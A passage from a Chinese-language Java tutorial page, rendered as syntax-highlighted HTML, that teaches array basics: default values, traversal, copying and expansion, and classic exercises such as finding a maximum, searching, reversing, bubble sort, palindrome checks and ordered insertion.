class="hljs-string">&quot;数组赋值后的值：&quot;</span> + Arrays.toString(arr01));<br><br><br>        <span class="hljs-comment">//使用初始化方式创建数组</span><br>        <span class="hljs-type">int</span>[] arr02 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-comment">//数组的访问</span><br>        System.out.println(arr02[<span class="hljs-number">3</span>]);<br>        System.out.println(arr02[<span class="hljs-number">7</span>]);<br><br>        <span class="hljs-comment">//在数组的范围与赋值过程中，一定要小心使用下标，注意下标越界的问题</span><br>        <span class="hljs-comment">//访问不存在的下标就会出现下标越界异常</span><br><span class="hljs-comment">//        System.out.println(arr02[11]);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-4-数组中的默认值"><a href="#1-4-数组中的默认值" class="headerlink" title="1.4 - 数组中的默认值"></a>1.4 - 数组中的默认值</h3><p>当数组定义完成后，数组会根据数据类型的不容而创建不同的默认值</p><table><thead><tr><th>数组中的数据类型</th><th>默认值</th></tr></thead><tbody><tr><td><code>byte short int long</code></td><td>0</td></tr><tr><td><code>float double</code></td><td>0.0</td></tr><tr><td><code>boolean</code></td><td>false</td></tr><tr><td><code>char</code></td><td>‘\u0000’  空</td></tr><tr><td><code>String</code></td><td>null</td></tr></tbody></table><h3 id="1-5-数组的特性"><a href="#1-5-数组的特性" class="headerlink" title="1.5 - 数组的特性"></a>1.5 - 数组的特性</h3><pre><code class="hljs">1、数组中的成员占用的是连续的存储空间2、数组名实为该数组的首地址3、数组的成员访问时，注意不要下标越界4、数组中的成员数据类型必须相同5、Java中的数组的长度一旦确定不能增减</code></pre><p><a name="6c066bf0"></a></p><h3 id="1-6-数组的遍历"><a href="#1-6-数组的遍历" class="headerlink" title="1.6 - 数组的遍历"></a>1.6 - 数组的遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  数组的遍历</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//初始化方式创建数组</span><br>        <span class="hljs-type">int</span>[] score = &#123;<span class="hljs-number">60</span>,<span class="hljs-number">66</span>,<span class="hljs-number">70</span>,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">90</span>,<span class="hljs-number">99</span>,<span class="hljs-number">100</span>&#125;;<br><br>        <span class="hljs-comment">//通过for循环一次取出每个成员  -  正序</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; score.length; i++) &#123;  <span class="hljs-comment">//score.length  获取数组的长度</span><br>            System.out.print(<span class="hljs-string">&quot;score[&quot;</span> + i + <span class="hljs-string">&quot;] = &quot;</span> + score[i] + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br><br>        System.out.println();<br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------------------&quot;</span>);<br><br>        <span class="hljs-comment">//数组逆序遍历</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> score.length - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span> ; i--) &#123;<br>            System.out.print(<span class="hljs-string">&quot;score[&quot;</span> + i + <span class="hljs-string">&quot;] = &quot;</span> + score[i] + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="aa084921"></a></p><h3 id="1-7-数组的扩容以及拷贝"><a href="#1-7-数组的扩容以及拷贝" class="headerlink" title="1.7 - 数组的扩容以及拷贝"></a>1.7 - 数组的扩容以及拷贝</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  数组的扩容以及拷贝</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr01 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//初始化方式创建数组</span><br><br>        <span class="hljs-comment">//方法一</span><br>        <span class="hljs-type">int</span>[] arr02 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr01.length * <span class="hljs-number">2</span>];<span class="hljs-comment">//创建新数组，长度默认为原数组长度2倍</span><br>        <span class="hljs-comment">//通过循环将原数组中的成员转移到新数组中</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr01.length; i++) &#123;<br>            arr02[i] = arr01[i];<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;arr01:&quot;</span> + Arrays.toString(arr01));<span class="hljs-comment">//打印原数组</span><br>        System.out.println(<span class="hljs-string">&quot;arr02:&quot;</span> + Arrays.toString(arr02));<span class="hljs-comment">//打印新数组</span><br><br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------------------------&quot;</span>);<br><br>        <span class="hljs-comment">//方法二:借助数组工具类Arrays中的方法</span><br>        <span class="hljs-comment">//参数1：原数组的引用    参数2：新数组的长度   返回值：新数组的引用</span><br>        <span class="hljs-comment">//兵器会帮助我们将原数组中的内容转移到新的数组中来</span><br>        <span class="hljs-type">int</span>[] arr03 = Arrays.copyOf(arr01, arr01.length * <span class="hljs-number">2</span>);<br>        System.out.println(<span class="hljs-string">&quot;arr01:&quot;</span> + Arrays.toString(arr01));<span class="hljs-comment">//打印原数组</span><br>        System.out.println(<span class="hljs-string">&quot;arr03:&quot;</span> + Arrays.toString(arr03));<span class="hljs-comment">//打印新数组</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="c2c3205f"></a></p><h3 id="1-8-数组中的经典算法"><a href="#1-8-数组中的经典算法" class="headerlink" title="1.8 - 数组中的经典算法"></a>1.8 - 数组中的经典算法</h3><p><a name="d019b4e0"></a></p><h4 id="1-8-1-求最值"><a href="#1-8-1-求最值" class="headerlink" title="1.8.1 - 求最值"></a>1.8.1 - 求最值</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  数组求最值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//通过随机类来生成数组中的数</span><br>        <span class="hljs-type">Random</span> <span class="hljs-variable">ran</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();   <span class="hljs-comment">//随机数范围规定在0 ~ 99之间</span><br>        <span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<span class="hljs-comment">//定义数组，长度为10</span><br><br>        <span class="hljs-comment">//1、每循环一次生成一个随机数，存储到数组中相对应的下标位置</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            arr[i] = ran.nextInt(<span class="hljs-number">100</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//2、找到数组中的最大值</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; arr.length; i++) &#123;<br>            max = arr[i] &gt; max ? arr[i] : max;<span class="hljs-comment">//借助三目运算符</span><br>        &#125;<br><br>        <span class="hljs-comment">//打印数组</span><br>        System.out.println(Arrays.toString(arr));<br>        <span class="hljs-comment">//3、最大值进行打印输出</span><br>        System.out.println(<span class="hljs-string">&quot;Max:&quot;</span> + max);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="8a064f1e"></a></p><h4 id="1-8-2-查找数组中指定的成员的值（所在位置）"><a href="#1-8-2-查找数组中指定的成员的值（所在位置）" class="headerlink" title="1.8.2 - 查找数组中指定的成员的值（所在位置）"></a>1.8.2 - 查找数组中指定的成员的值（所在位置）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  查找数组中指定的成员的值（所在位置）</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//使用初始化方式创建数组</span><br><br>        System.out.println(<span class="hljs-string">&quot;数组中的成员有：&quot;</span> + Arrays.toString(arr));<br><br>        System.out.println(<span class="hljs-string">&quot;请输入要查找的值：&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in).nextInt();<span class="hljs-comment">//通过文本扫描器来获取用户输入的整数类型数据</span><br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">resIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//用来记录值在数组中出现的位置</span><br>        <span class="hljs-comment">//用num变量，与数组中的每个值做对比</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            <span class="hljs-keyword">if</span>(num == arr[i])&#123;<span class="hljs-comment">//找值，如果找到了，则进入语句块中</span><br>                resIndex = i;<br><span class="hljs-comment">//                break;</span><br>                System.out.println(arr[resIndex] + <span class="hljs-string">&quot;在数组中出现的位置是：[&quot;</span> + resIndex + <span class="hljs-string">&quot;]&quot;</span>);<br>            &#125;<br>        &#125;<br><br><span class="hljs-comment">//        System.out.println(arr[resIndex] + &quot;在数组中第一次出现的位置是：[&quot; + resIndex + &quot;]&quot;);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="7634cf16"></a></p><h4 id="1-8-3-数组的逆序存储"><a href="#1-8-3-数组的逆序存储" class="headerlink" title="1.8.3 - 数组的逆序存储"></a>1.8.3 - 数组的逆序存储</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  数组的逆序存储</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;;<span class="hljs-comment">//初始化方式创建数组</span><br><br>        System.out.print(<span class="hljs-string">&quot;逆序存储之前：&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            System.out.print(arr[i] + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//数组的逆序算法</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,t; i &lt; arr.length / <span class="hljs-number">2</span>; i++) &#123;<br>            t = arr[i];<br>            arr[i] = arr[arr.length - <span class="hljs-number">1</span> - i];<br>            arr[arr.length - <span class="hljs-number">1</span> - i] = t;<br>        &#125;<br><br>        System.out.println();<br>        System.out.print(<span class="hljs-string">&quot;逆序存储之后：&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            System.out.print(arr[i] + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="b051b9ad"></a></p><h4 id="1-8-4-数组的排序（冒泡排序法升序）"><a href="#1-8-4-数组的排序（冒泡排序法升序）" class="headerlink" title="1.8.4 - 数组的排序（冒泡排序法升序）"></a>1.8.4 - 数组的排序（冒泡排序法升序）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  冒泡排序法（升序排序）</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">ran</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<span class="hljs-comment">//创建随机类对象</span><br>        <span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<span class="hljs-comment">//定义数组，长度为10</span><br><br>        <span class="hljs-comment">//使用随机类将数组中的成员填充满</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            arr[i] = ran.nextInt(<span class="hljs-number">100</span>);<span class="hljs-comment">//每循环一次，生成一个0 ~ 99之间的随机数，存放到数组中</span><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;数组中的成员有：&quot;</span> + Arrays.toString(arr));<br><br>        <span class="hljs-comment">//排序算法</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<span class="hljs-comment">//外循环循环一次，会找出一个最大值，控制循环次数的</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr.length - <span class="hljs-number">1</span> - i; j++) &#123;<span class="hljs-comment">//内循环控制前后连个数进行比较</span><br>                <span class="hljs-keyword">if</span>(arr[j] &gt; arr[j + <span class="hljs-number">1</span>])&#123;<span class="hljs-comment">//如果前面的值大于后面的值，将位置对调</span><br>                    <span class="hljs-type">int</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> arr[j];<br>                    arr[j] = arr[j + <span class="hljs-number">1</span>];<br>                    arr[j + <span class="hljs-number">1</span>] = t;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;冒 泡 排序 后：&quot;</span> + Arrays.toString(arr));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="83d0a242"></a></p><h4 id="1-8-5-回文"><a href="#1-8-5-回文" class="headerlink" title="1.8.5 - 回文"></a>1.8.5 - 回文</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  判断用户输入的是否是回文</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;请输入一串字符串：&quot;</span>); <span class="hljs-comment">//   a  b  c  d  d  c  b  a</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in).nextLine();<span class="hljs-comment">//获取用户输入的字符串</span><br><br>        <span class="hljs-comment">//做回文的判断</span><br>        <span class="hljs-type">int</span> i;<br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; str.length() / <span class="hljs-number">2</span>; i++)&#123;<br>            <span class="hljs-keyword">if</span>(str.charAt(i) != str.charAt(str.length() - <span class="hljs-number">1</span> - i))&#123;<br>                <span class="hljs-keyword">break</span>;<span class="hljs-comment">//如果不相等，则直接终止循环，</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//通过i记录的比较次数来判断是否是回文字符串</span><br>        <span class="hljs-keyword">if</span>(i &lt; (str.length() / <span class="hljs-number">2</span>))&#123;<br>            System.out.println(str + <span class="hljs-string">&quot;不是回文字符串&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(str + <span class="hljs-string">&quot;是回文字符串&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="dcba9f40"></a></p><h4 id="1-8-6-向有序数组中插入成员后仍保证数组有序"><a href="#1-8-6-向有序数组中插入成员后仍保证数组有序" class="headerlink" title="1.8.6 - 向有序数组中插入成员后仍保证数组有序"></a>1.8.6 - 向有序数组中插入成员后仍保证数组有序</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  向有序数组中插入成员后仍保证数组有序</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//定义长度为10的数组</span><br>        <span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br><br>        <span class="hljs-comment">//使用for循环初始化数组</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<br>            arr[i] = i + <span class="hljs-number">1</span>;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;插入前：&quot;</span> + Arrays.toString(arr));<br>        <span class="hljs-comment">//获取用户想要插入的整数类型</span><br>        System.out.println(<span class="hljs-string">&quot;请输入要插入的数值：&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in).nextInt();<br><br>        <span class="hljs-comment">//方法一：在末尾插入数据后，做冒泡排序法</span><br><span class="hljs-comment">//        arr[arr.length - 1] = num;</span><br><span class="hljs-comment">//        //冒泡排序法将数组排序</span><br><span class="hljs-comment">//        for (int i = 0; i &lt; arr.length - 1; i++) &#123;//控制比较的次数</span><br><span class="hljs-comment">//            for (int j = 0; j &lt; arr.length - 1 - i; j++) &#123;</span><br><span class="hljs-comment">//                if(arr[j] &gt; arr[j + 1])&#123;</span><br><span class="hljs-comment">//                    int t = arr[j];</span><br><span class="hljs-comment">//                    arr[j] = arr[j + 1];</span><br><span class="hljs-comment">//                    arr[j + 1] = t;</span><br><span class="hljs-comment">//                &#125;</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-comment">//方法二：先找到成员要插入的位置 ，然后将该位置之后的成员一次向后移动，然后再将成员插入到指定的位置即可</span><br>        <span class="hljs-type">int</span> place;<br>        <span class="hljs-keyword">for</span> (place = <span 